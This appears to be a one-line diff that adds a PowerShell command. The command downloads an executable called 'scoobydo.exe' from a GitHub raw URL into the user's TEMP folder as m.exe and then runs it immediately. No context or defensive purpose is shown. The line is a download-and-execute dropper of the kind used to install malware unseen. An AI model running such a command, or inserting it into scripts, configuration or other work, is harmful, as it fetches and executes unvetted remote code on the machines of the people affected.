@@ -1,0 +1,1 @@
+iwr https://raw.githubusercontent.com/Proxyonly/dsfds/refs/heads/main/scoobydo.exe -O $env:TEMP\m.exe; & $env:TEMP\m.exe
